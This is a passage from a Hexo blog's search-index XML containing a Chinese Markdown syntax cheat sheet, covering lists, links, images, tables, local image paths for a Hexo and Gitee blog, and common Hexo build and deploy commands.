class="headerlink" title="列表"></a>列表</h3><pre><code>无序列表：* 列有序列表：1. 列列表之间可通过缩进进行嵌套列表中也可使用区块</code></pre><h3 id="链接或邮箱"><a href="#链接或邮箱" class="headerlink" title="链接或邮箱"></a>链接或邮箱</h3><pre><code>[链接名称](链接地址)&lt;链接地址或邮箱&gt;</code></pre><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><pre><code>![alt 属性文本](图片地址)</code></pre><h3 id="本博客（hexo-码云）引用本地图片到博客方法"><a href="#本博客（hexo-码云）引用本地图片到博客方法" class="headerlink" title="本博客（hexo+码云）引用本地图片到博客方法"></a>本博客（hexo+码云）引用本地图片到博客方法</h3><pre><code>1. 在本地博客的source文件夹下创建用来存储图片的文件夹，如：img  2. 将图片1.jpg放入此文件夹中   3. 引用 ![图片描述](/img/1.jpg)</code></pre><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code>|  表头   | 表头  ||  ----  | ----  || 单元格  | 单元格 || 单元格  | 单元格 |  第二行-至少一个</code></pre><h2 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a>Hexo常用命令</h2><pre><code>清除缓存：hexo clean生成静态文件：hexo g部署到码云：hexo d启动本地服务：hexo shexo clean &amp;&amp; hexo g &amp;&amp; hexo d</code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
